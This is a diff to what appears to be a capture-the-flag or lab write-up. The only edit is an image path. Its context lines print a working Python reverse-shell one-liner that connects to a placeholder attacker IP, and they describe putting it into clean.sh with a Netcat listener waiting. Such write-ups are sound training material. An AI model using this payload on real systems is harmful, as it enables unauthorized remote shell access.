@@ -186,7 +186,7 @@ I replaced the contents of **clean.sh** with a Python reverse shell payload.
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![Modified clean.sh](image/pa6.png)
+![Modified clean.sh](images/pa6.png)
 
 Before uploading the modified script, I started a Netcat listener on my attacking machine.
 
